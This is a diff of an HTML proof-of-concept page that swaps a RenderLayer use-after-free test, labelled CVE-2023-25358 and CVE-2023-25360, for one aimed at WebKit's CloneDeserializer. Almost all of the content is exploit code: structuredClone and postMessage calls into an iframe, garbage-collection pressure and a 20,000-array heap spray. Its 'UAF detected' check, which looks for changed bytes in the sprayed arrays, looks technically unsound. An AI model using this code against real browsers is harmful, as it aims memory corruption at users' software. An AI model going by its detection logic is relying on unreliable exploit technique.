@@ -3,25 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CVE-2023-25358 & CVE-2023-25360 PoC</title>
+    <title>WebKit CloneDeserializer UAF PoC</title>
     <style>
-        #element1, #element2 {
-            position: absolute;
-            width: 180px;
-            height: 180px;
-            overflow: hidden;
-            background: purple;
-        }
-        #element2 {
-            background: orange;
-            left: 200px;
-        }
-        #newElement {
-            width: 60px;
-            height: 60px;
-            background: cyan;
-        }
-        button {
+        #trigger {
             margin: 20px 0;
             padding: 12px;
             font-size: 18px;
@@ -30,80 +14,91 @@
         #status {
             margin-top: 10px;
             font-weight: bold;
-            color: darkblue;
+            color: darkgreen;
+        }
+        #container {
+            display: none;
         }
     </style>
 </head>
 <body>
-    <h1>CVE-2023-25358 & CVE-2023-25360: RenderLayer UAF</h1>
+    <h1>WebKit CloneDeserializer::deserialize() UAF PoC</h1>
     <p>Click to trigger the PoC. Expect a crash or UAF detection.</p>
     <button id="trigger">Trigger PoC</button>
-    <div id="status">Waiting...</div>
-    <div id="container">
-        <div id="element1"></div>
-        <div id="element2"></div>
-    </div>
+    <div id="status">Idle...</div>
+    <div id="container"></div>
     <script>
         const container = document.getElementById('container');
-        const element1 = document.getElementById('element1');
-        const element2 = document.getElementById('element2');
         const status = document.getElementById('status');
         let attemptCount = 0;
 
         function sprayHeap() {
             const arrays = [];
-            for (let i = 0; i < 18000; i++) {
+            for (let i = 0; i < 20000; i++) {
                 const buf = new Uint8Array(4096);
-                buf.fill(0x44); // Fill with 'D'
+                buf.fill(0x45); // Fill with 'E'
                 arrays.push(buf);
             }
             return arrays;
         }
 
+        function stressGC() {
+            // Allocate large objects to pressure GC
+            for (let i = 0; i < 1000; i++) {
+                new ArrayBuffer(1024 * 1024); // 1MB buffers
+            }
+        }
+
         function triggerExploit() {
             attemptCount++;
-            console.log(`Attempt ${attemptCount}: Starting exploit...`);
+            console.log(`Attempt ${attemptCount}: Initiating exploit...`);
             status.textContent = `Attempt ${attemptCount} in progress...`;
 
-            // Step 1: Remove elements to free RenderLayer
-            element1.style.display = 'block';
-            element2.style.display = 'block';
-            container.removeChild(element1);
-            container.removeChild(element2);
+            try {
+                // Step 1: Create serializable objects
+                const arrayBuffer = new ArrayBuffer(1024);
+                const messagePort = new MessageChannel().port1;
+                const complexObject = {
+                    buffer: arrayBuffer,
+                    port: messagePort,
+                    nested: [new Uint8Array(100), { x: new ArrayBuffer(512) }]
+                };
 
-            // Step 2: Manipulate DOM and trigger render tree updates
-            setTimeout(() => {
-                try {
-                    // Re-add element1 for CVE-2023-25360 (renderer)
-                    container.appendChild(element1);
-                    // Add new element for CVE-2023-25358 (addChild)
-                    const newElement = document.createElement('div');
-                    newElement.id = 'newElement';
-                    newElement.style.width = '60px';
-                    newElement.style.height = '60px';
-                    newElement.style.background = 'cyan';
-                    container.appendChild(newElement);
-                    // Multiple execCommand to maximize render tree updates
-                    document.execCommand('fontSize', false, '6');
-                    document.execCommand('bold', false, null);
-                    // Spray heap
-                    const arrays = sprayHeap();
-                    // Check for UAF
-                    console.log('Checking for UAF...');
-                    for (let i = 0; i < arrays.length; i++) {
-                        if (arrays[i][0] !== 0x44) {
-                            console.log(`UAF detected at index ${i}`);
-                            status.textContent = 'UAF detected!';
-                            return;
-                        }
+                // Step 2: Use structuredClone to trigger CloneDeserializer
+                const iframe = document.createElement('iframe');
+                container.appendChild(iframe);
+                const iframeWindow = iframe.contentWindow;
+
+                // Post message to force serialization/deserialization
+                iframeWindow.postMessage(structuredClone(complexObject, {
+                    transfer: [arrayBuffer, messagePort]
+                }), '*');
+
+                // Step 3: Stress GC to free objects
+                stressGC();
+
+                // Step 4: Spray heap
+                const arrays = sprayHeap();
+
+                // Step 5: Check for UAF
+                console.log('Scanning for UAF...');
+                for (let i = 0; i < arrays.length; i++) {
+                    if (arrays[i][0] !== 0x45) {
+                        console.log(`UAF detected at index ${i}`);
+                        status.textContent = 'UAF detected!';
+                        return;
                     }
-                    console.log('Exploit completed, check for crash.');
-                    status.textContent = 'Exploit attempted!';
-                } catch (err) {
-                    console.error(`Error: ${err.message}`);
-                    status.textContent = 'Failed: Error occurred.';
                 }
-            }, 60);
+
+                console.log('Exploit attempt completed, check for crash.');
+                status.textContent = 'Exploit attempted!';
+
+                // Clean up
+                container.removeChild(iframe);
+            } catch (err) {
+                console.error(`Error: ${err.message}`);
+                status.textContent = 'Failed: Error occurred.';
+            }
         }
 
         const observer = new MutationObserver(() => {
@@ -120,6 +115,12 @@
                 console.error(`Error: ${err.message}`);
                 status.textContent = 'Failed: Error occurred.';
             }
+        });
+
+        // Listen for messages to ensure deserialization occurs
+        window.addEventListener('message', (event) => {
+            console.log('Message received, deserialization triggered.');
+            stressGC(); // Additional GC stress after deserialization
         });
     </script>
 </body>
